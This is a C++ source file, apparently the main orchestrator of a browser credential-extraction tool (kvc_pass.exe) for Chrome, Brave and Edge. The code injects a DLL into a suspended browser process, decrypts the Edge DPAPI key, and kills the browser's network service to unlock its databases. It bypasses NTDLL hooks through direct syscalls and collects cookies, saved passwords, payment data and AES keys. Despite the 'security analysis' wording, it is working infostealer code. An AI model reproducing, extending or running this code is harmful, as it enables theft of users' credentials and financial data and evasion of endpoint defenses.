// OrchestratorCore.cpp - Main orchestration and application entry point
// Coordinates process management, injection, and extraction workflow
#include "OrchestratorCore.h"
#include "BrowserProcessManager.h"
#include "InjectionEngine.h"
#include "CommunicationLayer.h"
#include "BannerSystem.h"
#include "BrowserHelp.h"
#include "syscalls.h"
#include <iostream> 
#include <algorithm>
#include <map>
#include <sstream>

namespace
{
    constexpr const char* APP_VERSION = "1.0.1";
    constexpr const char* SECURITY_MODULE_NAME = "kvc_crypt.dll";
}

std::string g_securityModulePath;

// Parses command-line arguments into configuration structure
std::optional<Configuration> Configuration::CreateFromArgs(int argc, wchar_t* argv[], const Console& console)
{
    Configuration config;
    fs::path customOutputPath;

    for (int i = 1; i < argc; ++i)
    {
        std::wstring_view arg = argv[i];
        if (arg == L"--verbose" || arg == L"-v")
            config.verbose = true;
        else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
            customOutputPath = argv[++i];
        else if (arg == L"--help" || arg == L"-h")
        {
            BrowserHelp::PrintUsage(L"kvc_pass.exe");
            return std::nullopt;
        }
        else if (config.browserType.empty() && !arg.empty() && arg[0] != L'-')
            config.browserType = arg;
        else
        {
            console.Warn("Unknown or misplaced argument: " + Utils::WStringToUtf8(arg));
            return std::nullopt;
        }
    }

    if (config.browserType.empty())
    {
        BrowserHelp::PrintUsage(L"kvc_pass.exe");
        return std::nullopt;
    }

    std::transform(config.browserType.begin(), config.browserType.end(), 
                  config.browserType.begin(), ::towlower);

    static const std::map<std::wstring, std::wstring> browserExeMap = {
        {L"chrome", L"chrome.exe"},
        {L"brave", L"brave.exe"},
        {L"edge", L"msedge.exe"}
    };

    auto it = browserExeMap.find(config.browserType);
    if (it == browserExeMap.end())
    {
        console.Error("Unsupported browser type: " + Utils::WStringToUtf8(config.browserType));
        return std::nullopt;
    }

    config.browserProcessName = it->second;

    BrowserPathResolver resolver(console);
    config.browserDefaultExePath = resolver.resolve(config.browserProcessName);

    if (config.browserDefaultExePath.empty())
    {
        console.Error("Could not find " + Utils::WStringToUtf8(config.browserType) + 
                     " installation in Registry");
        console.Info("Please ensure " + Utils::WStringToUtf8(config.browserType) + 
                    " is properly installed");
        return std::nullopt;
    }

    config.browserDisplayName = Utils::Capitalize(Utils::WStringToUtf8(config.browserType));
    config.outputPath = customOutputPath.empty() ? fs::current_path() / "output" : 
                       fs::absolute(customOutputPath);

    return config;
}

// Fix stale TypeLib registry paths after Chrome/Brave auto-update.
// Chrome updates its executable but sometimes leaves TypeLib registry entries pointing
// to the old (deleted) elevation_service.exe, causing CoCreateInstance TYPE_E_CANTLOADLIBRARY.
void FixChromeTypeLibPaths(const std::wstring& browserExePath, const Console& console)
{
    // Chrome installs to Application\chrome.exe but stores versioned binaries under
    // Application\<version>\elevation_service.exe. We must scan for the version directory.
    fs::path appDir = fs::path(browserExePath).parent_path();

    fs::path elevSvc;

    // Case 1: already in versioned dir (e.g. Application\146.0.7680.165\chrome.exe)
    fs::path candidate = appDir / L"elevation_service.exe";
    if (fs::exists(candidate))
        elevSvc = candidate;

    // Case 2: appDir is Application\, version dirs are subdirectories
    if (elevSvc.empty())
    {
        std::vector<int> bestVersion;
        std::error_code ec;
        for (const auto& entry : fs::directory_iterator(appDir, ec))
        {
            if (!entry.is_directory(ec))
                continue;

            std::wstring dirName = entry.path().filename().wstring();
            std::vector<int> parts;
            std::wistringstream ss(dirName);
            std::wstring token;
            bool valid = true;
            while (std::getline(ss, token, L'.'))
            {
                try { parts.push_back(std::stoi(token)); }
                catch (...) { valid = false; break; }
            }
            if (!valid || parts.size() != 4)
                continue;

            fs::path svcCandidate = entry.path() / L"elevation_service.exe";
            if (!fs::exists(svcCandidate, ec))
                continue;

            if (bestVersion.empty() || parts > bestVersion)
            {
                bestVersion = parts;
                elevSvc = svcCandidate;
            }
        }
    }

    if (elevSvc.empty())
        return;

    std::wstring newPath = elevSvc.wstring();

    const wchar_t* const typeLibGuids[] = {
        L"{463ABECF-410D-407F-8AF5-0DF35A005CC8}",  // IElevatorChrome
        L"{B88C45B9-8825-4629-B83E-77CC67D9CEED}",  // IElevatorChromium
        L"{A2721D66-376E-4D2F-9F0F-9070E9A42B5F}",  // IElevatorChromeBeta
        L"{BB2AA26B-343A-4072-8B6F-80557B8CE571}",  // IElevatorChromeDev
        L"{4F7CE041-28E9-484F-9DD0-61A8CACEFEE4}",  // IElevatorChromeCanary
    };

    for (const auto* guid : typeLibGuids)
    {
        for (const auto* arch : { L"win32", L"win64" })
        {
            std::wstring regPath = std::wstring(L"SOFTWARE\\Classes\\TypeLib\\") + guid + L"\\1.0\\0\\" + arch;
            HKEY hKey = nullptr;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regPath.c_str(), 0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS)
                continue;

            wchar_t curVal[MAX_PATH] = {};
            DWORD sz = sizeof(curVal);
            DWORD type = 0;
            if (RegQueryValueExW(hKey, nullptr, nullptr, &type, reinterpret_cast<LPBYTE>(curVal), &sz) == ERROR_SUCCESS
                && type == REG_SZ && !fs::exists(curVal))
            {
                RegSetValueExW(hKey, nullptr, 0, REG_SZ,
                    reinterpret_cast<const BYTE*>(newPath.c_str()),
                    static_cast<DWORD>((newPath.size() + 1) * sizeof(wchar_t)));
                console.Debug("Fixed stale TypeLib path for " + Utils::WStringToUtf8(guid) +
                    " [" + Utils::WStringToUtf8(arch) + "]");
            }
            RegCloseKey(hKey);
        }
    }
}

// Orchestrates complete injection workflow: cleanup, injection, execution, termination
PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration& config, const Console& console)
{
    std::vector<uint8_t> edgeDpapiKey;
    
    // Edge-specific: Extract DPAPI key in orchestrator before process creation
    if (config.browserType == L"edge")
    {
        // Try multiple possible Edge installation paths
        std::vector<fs::path> possiblePaths = {
            Utils::GetLocalAppDataPath() / "Microsoft" / "Edge" / "User Data" / "Local State",
            Utils::GetLocalAppDataPath() / "Microsoft" / "Edge Beta" / "User Data" / "Local State", 
            Utils::GetLocalAppDataPath() / "Microsoft" / "Edge Dev" / "User Data" / "Local State"
        };
        
        for (const auto& edgeLocalState : possiblePaths) 
        {
            if (fs::exists(edgeLocalState)) 
            {
                edgeDpapiKey = DecryptEdgePasswordKeyWithDPAPI(edgeLocalState, console);
                
                if (!edgeDpapiKey.empty()) 
                {
                    break;
                }
            }
        }
        
        if (edgeDpapiKey.empty()) 
        {
            console.Warn("Could not extract Edge DPAPI key - passwords may not be available");
        }
    }

    // For Chrome/Brave: fix stale TypeLib paths that break CoCreateInstance after auto-update
    if (config.browserType != L"edge")
        FixChromeTypeLibPaths(config.browserDefaultExePath, console);

    // Kill network service for all browsers — releases Cookies/LoginData DB locks
    // Keep main browser process alive for all browsers — COM elevation service must stay reachable
    KillBrowserNetworkService(config, console);


    // Create suspended target process
    TargetProcess target(config, console);
    target.createSuspended();

    // Establish named pipe communication
    PipeCommunicator pipe(Utils::GenerateUniquePipeName(), console);
    pipe.create();

    // Inject security module and create remote thread
    InjectionManager injector(target, console);
    injector.execute(pipe.getName());

    // Wait for module connection and send configuration
    pipe.waitForClient();
    pipe.sendInitialData(config.verbose, config.outputPath, edgeDpapiKey);

    // Kill network service again right before DLL starts extraction.
    // The DLL spends ~500ms on COM key decryption after receiving config,
    // so this second kill hits just before the Cookies database is opened.
    // Chrome rarely needs this because it restarts its network service slower than Edge.
    KillBrowserNetworkService(config, console);

    pipe.relayMessages();

    // Cleanup
    target.terminate();

    return pipe.getStats();
}

// Processes all installed browsers sequentially
void ProcessAllBrowsers(const Console& console, bool verbose, const fs::path& outputPath)
{
    if (verbose)
        console.Info("Starting multi-browser security analysis...");

    BrowserPathResolver resolver(console);
    auto installedBrowsers = resolver.findAllInstalledBrowsers();

    if (installedBrowsers.empty())
    {
        console.Error("No supported browsers found on this system");
        return;
    }

    if (!verbose)
        console.Info("Processing " + std::to_string(installedBrowsers.size()) + " browser(s):\n");

    int successCount = 0;
    int failCount = 0;

    for (size_t i = 0; i < installedBrowsers.size(); ++i)
    {
        const auto& [browserType, browserPath] = installedBrowsers[i];

        Configuration config;
        config.verbose = verbose;
        config.outputPath = outputPath;
        config.browserType = browserType;
        config.browserDefaultExePath = browserPath;
        
        static const std::map<std::wstring, std::pair<std::wstring, std::string>> browserMap = {
            {L"chrome", {L"chrome.exe", "Chrome"}},
            {L"edge",   {L"msedge.exe", "Edge"}},
            {L"brave",  {L"brave.exe",  "Brave"}}
        };

        auto it = browserMap.find(browserType);
        if (it != browserMap.end())
        {
            config.browserProcessName = it->second.first;
            config.browserDisplayName = it->second.second;
        }

        if (verbose)
        {
            console.Info("\n[Browser " + std::to_string(i + 1) + "/" + 
                        std::to_string(installedBrowsers.size()) +
                        "] Processing " + config.browserDisplayName);
        }

        try
        {
            auto stats = RunInjectionWorkflow(config, console);
            successCount++;

            if (verbose)
            {
                console.Success(config.browserDisplayName + " analysis completed");
            }
            else
            {
                DisplayExtractionSummary(config.browserDisplayName, stats, console, false, 
                                        config.outputPath);
                if (i < installedBrowsers.size() - 1)
                    std::cout << std::endl;
            }
        }
        catch (const std::exception& e)
        {
            failCount++;

            if (verbose)
            {
                console.Error(config.browserDisplayName + " analysis failed: " + std::string(e.what()));
            }
            else
            {
                console.Info(config.browserDisplayName);
                console.Error("Analysis failed");
                if (i < installedBrowsers.size() - 1)
                    std::cout << std::endl;
            }
        }
    }

    std::cout << std::endl;
    console.Info("Completed: " + std::to_string(successCount) + " successful, " + 
                std::to_string(failCount) + " failed");
}

// Displays formatted extraction summary with statistics
void DisplayExtractionSummary(const std::string& browserName, 
                              const PipeCommunicator::ExtractionStats& stats,
                              const Console& console, bool singleBrowser, 
                              const fs::path& outputPath)
{
    if (singleBrowser)
    {
        if (!stats.aesKey.empty())
            console.Success("AES Key: " + stats.aesKey);

        std::string summary = BuildExtractionSummary(stats);
        if (!summary.empty())
        {
            console.Success(summary);
            console.Success("Stored in " + Utils::path_to_api_string(outputPath / browserName));
        }
        else
        {
            console.Warn("No data extracted");
        }
    }
    else
    {
        console.Info(browserName);

        if (!stats.aesKey.empty())
            console.Success("AES Key: " + stats.aesKey);

        std::string summary = BuildExtractionSummary(stats);
        if (!summary.empty())
        {
            console.Success(summary);
            console.Success("Stored in " + Utils::path_to_api_string(outputPath / browserName));
        }
        else
        {
            console.Warn("No data extracted");
        }
    }
}

// Builds human-readable summary from extraction statistics
std::string BuildExtractionSummary(const PipeCommunicator::ExtractionStats& stats)
{
    std::stringstream summary;
    std::vector<std::string> items;

    if (stats.totalCookies > 0)
        items.push_back(std::to_string(stats.totalCookies) + " cookies");
    if (stats.totalPasswords > 0)
        items.push_back(std::to_string(stats.totalPasswords) + " passwords");
    if (stats.totalPayments > 0)
        items.push_back(std::to_string(stats.totalPayments) + " payments");

    if (!items.empty())
    {
        summary << "Extracted ";
        for (size_t i = 0; i < items.size(); ++i)
        {
            if (i > 0 && i == items.size() - 1)
                summary << " and ";
            else if (i > 0)
                summary << ", ";
            summary << items[i];
        }
        summary << " from " << stats.profileCount << " profile" 
                << (stats.profileCount != 1 ? "s" : "");
    }

    return summary.str();
}

// Application entry point
int wmain(int argc, wchar_t* argv[])
{
    bool isVerbose = false;
    std::wstring browserTarget;
    fs::path outputPath;
    
    // Locate security module in current directory or System32
    auto findSecurityModule = []() -> std::string {
        if (fs::exists(SECURITY_MODULE_NAME))
            return SECURITY_MODULE_NAME;
        
        wchar_t systemDir[MAX_PATH];
        if (GetSystemDirectoryW(systemDir, MAX_PATH) > 0) {
            std::string systemPath = Utils::WStringToUtf8(systemDir) + "\\" + SECURITY_MODULE_NAME;
            if (fs::exists(systemPath))
                return systemPath;
        }
        
        return "";
    };

    g_securityModulePath = findSecurityModule();
    if (g_securityModulePath.empty())
    {
        std::wcerr << L"Error: " << SECURITY_MODULE_NAME 
                   << L" not found in current directory or System32!" << std::endl;
        return 1;
    }
    
    // Quick argument parsing for early options
    for (int i = 1; i < argc; ++i)
    {
        std::wstring_view arg = argv[i];
        if (arg == L"--verbose" || arg == L"-v")
            isVerbose = true;
        else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
            outputPath = argv[++i];
		if (arg == L"--help" || arg == L"-h")
		{
			BrowserHelp::PrintUsage(L"kvc_pass.exe");
			return 0;
		}
        else if (browserTarget.empty() && !arg.empty() && arg[0] != L'-')
            browserTarget = arg;
    }

    Console console(isVerbose);
    Banner::PrintHeader();
    
    // Verify SQLite library availability
    if (!CheckWinSQLite3Available())
    {
        console.Warn("winsqlite3.dll not available - trying fallback to sqlite3.dll");
        if (!fs::exists("sqlite3.dll"))
        {
            console.Error("Neither winsqlite3.dll nor sqlite3.dll available");
            return 1;
        }
    }

    if (browserTarget.empty())
    {
        BrowserHelp::PrintUsage(L"kvc_pass.exe");
        return 0;
    }
    
    // Initialize direct syscalls
    if (!InitializeSyscalls(isVerbose))
    {
        console.Error("Failed to initialize direct syscalls. Critical NTDLL functions might be hooked.");
        return 1;
    }
    
    // Ensure output directory exists
    if (outputPath.empty())
        outputPath = fs::current_path() / "output";

    std::error_code ec;
    if (!fs::exists(outputPath)) {
        fs::create_directories(outputPath, ec);
        if (ec) {
            console.Error("Failed to create output directory: " + 
                         Utils::path_to_api_string(outputPath) + ". Error: " + ec.message());
            return 1;
        }
    }
    
    // Process browser(s)
    if (browserTarget == L"all")
    {
        try
        {
            ProcessAllBrowsers(console, isVerbose, outputPath);
        }
        catch (const std::exception& e)
        {
            console.Error(e.what());
            return 1;
        }
    }
    else
    {
        auto optConfig = Configuration::CreateFromArgs(argc, argv, console);
        if (!optConfig)
            return 1;

        try
        {
            if (!isVerbose)
                console.Info("Processing " + optConfig->browserDisplayName + "...\n");

            auto stats = RunInjectionWorkflow(*optConfig, console);

            if (!isVerbose)
                DisplayExtractionSummary(optConfig->browserDisplayName, stats, console, true, 
                                        optConfig->outputPath);
            else
                console.Success("\nSecurity analysis completed successfully");
        }
        catch (const std::runtime_error& e)
        {
            console.Error(e.what());
            return 1;
        }
    }

    console.Debug("Security orchestrator finished successfully.");
	Banner::PrintFooter();
    return 0;
}